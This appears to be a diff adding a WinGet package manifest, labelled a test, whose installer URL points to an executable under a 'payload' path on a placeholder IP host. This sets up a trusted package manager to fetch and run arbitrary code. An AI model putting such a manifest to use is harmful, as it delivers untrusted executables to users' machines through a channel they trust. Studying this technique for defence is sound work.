@@ -1,0 +1,14 @@
+PackageIdentifier: TestInstall
+PackageVersion: 1.0.0
+PackageLocale: en-US
+Publisher: Acme
+PackageName: Test
+License: MIT
+ShortDescription: WinGet test
+Installers:
+ - Architecture: x64
+   InstallerType: exe
+   InstallerUrl: http://IP地址/payload/white/hi.exe
+   InstallerSha256: 8b7f0ec36d61ccb1598225842303a424f3dc6fd09e0d5d0ae89a7ab6456b30da  //sha256sum hi.exe
+ManifestType: singleton
+ManifestVersion: 1.0.0
